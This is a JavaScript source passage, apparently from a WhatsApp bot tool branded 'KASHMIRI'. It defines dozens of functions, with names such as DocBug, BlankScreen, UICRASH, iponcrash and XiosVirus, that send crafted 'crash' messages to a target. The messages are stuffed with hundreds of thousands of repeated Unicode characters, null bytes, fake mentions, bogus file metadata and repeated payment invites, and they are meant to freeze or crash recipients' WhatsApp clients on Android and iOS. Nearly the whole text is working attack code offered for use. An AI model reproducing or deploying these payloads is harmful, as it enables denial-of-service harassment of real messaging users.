  for (let i = 0; i < 1; i++) {
    let largeText = "\u0000".repeat(11999);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: '🆘⃢⃝⃝⃝⃝⃝△𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨' + "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "🆘⃢⃝⃝⃝⃝⃝△𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  await conn.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(``);
  await conn.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await conn.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  console.log(``);
}
async function invc2(target, ptcp = true) {
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "🐉⃝⃞⃝⃞⃝⃞⃝⃞⃝⃞⃝⃞⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃞⃞⃞⃞⃞⃞⃞⃞⃞⃞⃞⏤𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 ͟͟͞͞𝐈𝐧𝐯𝐜⏤𝐕𝟑.𝟎.𝟎͟͟͞📵͞",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "KASHMIRI "
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await conn.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
 // end function //

 // FUNC BUG TEMBUS UI SISTEM 🔥
async function DocBug(target) {
 let virtex = "🐉⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 ͢𝐗 𝐃𝐨𝐜𝐁𝐮𝐠͟͟͞🐉";
   conn.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🐉⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 ͢𝐗 𝐃𝐨𝐜𝐁𝐮𝐠͟͟͞🐉" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function LocaBugs(target) {
 await conn.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `🐉⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 ͢𝐗 𝐋𝐨𝐜𝐚𝐁𝐮𝐠𝐬͟͟͞🚫`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "🐉⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 ͢𝐗 𝐋𝐨𝐜𝐚𝐁𝐮𝐠𝐬͟͟͞🚫" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
 async function BlankScreen(target, Ptcp = false) {
let virtex = "🔥⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 ͢𝐗 𝐁𝐥𝐚𝐧𝐤𝐒𝐜𝐫𝐞𝐞𝐧͟͟͞♨️" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
			await conn.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Hayolo",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://img1.pixhost.to/images/5120/589174536_yanzhosting.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://img1.pixhost.to/images/5120/589174536_yanzhosting.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log('🔥⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 ͢𝐗 𝐁𝐥𝐚𝐧𝐤𝐒𝐜𝐫𝐞𝐞𝐧͟͟͞♨️')
   	};

	async function crashui2(target, ptcp = false) {
    await conn.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟐⃠💮⃢📵" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function systemUi2(target, Ptcp = false) {
    conn.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵",
                        buttons: [
                            {
                                name: "quick_xreply",
                                buttonParamsJson: "{\"display_text\":\"㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵\",\"id\":\".groupchat\"}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: {
                                    title: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵",
                                    sections: [
                                        {
                                            title: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵",
                                            rows: []
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵" }]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
}
async function UICRASH(target, ptcp = true) {
  try {
    await conn.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵⭑̤\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function crashUiV5(target, Ptcp = false) {
    conn.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
};
async function systemUi(target, Ptcp = false) {
    conn.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵" }]
                    }
                }
            }
        }
    },{ participant: { jid: target },  messageId: null });
};
// Command handler
async function NotifKill(target) {
      conn.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `🔴⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  𝐊𝐈𝐋𝐋 𝐍𝐎𝐓𝐈𝐅 ✰ 𝐔𝐈 𝐍𝐎𝐓𝐈𝐅 𝐂𝐑𝐀𝐒𝐇⃠💀⃢🛑` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "🔴⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  𝐊𝐈𝐋𝐋 𝐍𝐎𝐓𝐈𝐅 ✰ 𝐔𝐈 𝐍𝐎𝐓𝐈𝐅 𝐂𝐑𝐀𝐒𝐇⃠💀⃢🛑" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

 // FUNC BUG I-PHONE KASHMIRI  🐉
async function aipong(target) {
await conn.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
async function iponcrash(target) {
await conn.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await conn.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await conn.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}
 
 // FUNC BUG IOS KASHMIRI  🐉
async function UpiCrash(target) {
      await conn.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await conn.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await conn.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await conn.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SqCrash(target) {
      await conn.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await conn.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await conn.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://www.facebook.com/61557890768940/posts/pfbid02qUhvPkN9c6Nuj4tesABBEZFthgtuCjNf7B3kAnYsbmxj6te3rN8uoSSxss5gELXTl/?app=fbl",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayIos(target) {
      await conn.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await conn.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      conn.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𐎟🩸⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𒁂𝐐𝐃͢𝐈𝐏𝐇𝐎𝐍𝐄͢ 🐉⃝⃝𐎟" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //
    async function XiosVirus(target) {
      conn.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𐎟🩸⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𒁂𝐗𝐈𝐎𝐒͢𝐕𝐈𝐑𝐔𝐒͢ 🐉⃝⃝𐎟` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𐎟🩸⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𒁂𝐗𝐈𝐎𝐒͢𝐕𝐈𝐑𝐔𝐒͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //===========================//
       // FUNC BUG KASHMIRI 
 async function FrezeeMsg1(target) {
            let virtex = "𐎟🔴⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟏͢ 🐉⃝⃝𐎟` + ";

            conn.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𐎟🔴⃝⃝𝐕𝐈𝐋𝐄𝐒𝐓𝐀͢𝐂𝐗𝐓𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟏͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "RuzxxHere" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
     console.log(chalk.white.bold("𐎟🔴⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐗𝐂𝐓𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟏͢ 🐉⃝⃝𐎟"));
        }
    
  //===========================\\  
         // FUNC BUG KASHMIRI 
 async function FrezeeMsg2(target) {
            let virtex = "𐎟💫⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐂𝐒𝐘𝐋𝐘𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟐͢ 🐉⃝⃝𐎟";
            let memekz = Date.now();

            await conn.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "💫⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟐͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
  console.log("𐎟💫⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟐͢ 🐉⃝⃝𐎟");   
        };

  async function f10(target, Ptcp = false) {
    await conn.relayMessage(target, {
      extendedTextMessage: {
        text: "`© KASHMIRI  🔥 Func f10`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
        contextInfo: {
          mentionedJid: ["923255516992 @s.whatsapp.net", ...Array.from({
            length: 15000
          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
          stanzaId: "1234567890ABCDEF",
          participant: "923255516992 @s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: false,
              callOutcome: "5",
              durationSecs: "999",
              callType: "REGULAR",
              participants: [{
                jid: "923255516992 @s.whatsapp.net",
                callOutcome: "5"
              }]
            }
          },
          remoteJid: target,
          conversionSource: " X ",
